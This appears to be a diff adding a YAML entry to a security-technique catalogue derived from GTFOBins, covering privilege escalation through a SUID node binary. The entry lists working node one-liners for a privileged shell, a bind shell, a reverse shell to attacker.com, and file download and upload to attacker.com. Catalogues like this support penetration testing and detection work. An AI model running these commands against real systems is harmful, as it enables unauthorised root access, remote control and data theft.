@@ -1,0 +1,133 @@
+id: gtfobins/node/shell/suid
+type: binary
+platform: linux
+name: node
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'node -e ''require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'''
+references:
+- https://gtfobins.github.io/gtfobins/node/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        node:
+          functions:
+            bind-shell:
+            - code: "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function\
+                \ (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n\
+                }).listen(12345)'"
+              connector: tcp-client
+              contexts:
+                sudo: null
+                suid:
+                  code: "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"\
+                    net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n\
+                    \  sh.stderr.pipe(client);\n}).listen(12345)'"
+                unprivileged: null
+            download:
+            - code: node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: http-server
+            file-read:
+            - code: node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(12345,\
+                \ \"attacker.com\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n \
+                \ sh.stderr.pipe(this);\n})'"
+              contexts:
+                sudo: null
+                suid:
+                  code: "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"\
+                    net\").connect(12345, \"attacker.com\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n\
+                    \  sh.stderr.pipe(this);\n})'"
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: 'node -e ''require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'''
+              contexts:
+                capabilities:
+                  code: 'node -e ''process.setuid(0); require("child_process").spawn("/bin/sh", {stdio:
+                    [0, 1, 2]})'''
+                  list:
+                  - CAP_SETUID
+                sudo: null
+                suid:
+                  code: 'node -e ''require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'''
+                unprivileged: null
+            upload:
+            - code: node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: http-server
+    upstream_url: https://gtfobins.github.io/gtfobins/node/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:3dd9500da8fa655f4513cc182428d126732d934bc7db34f59a6626e50dd60296
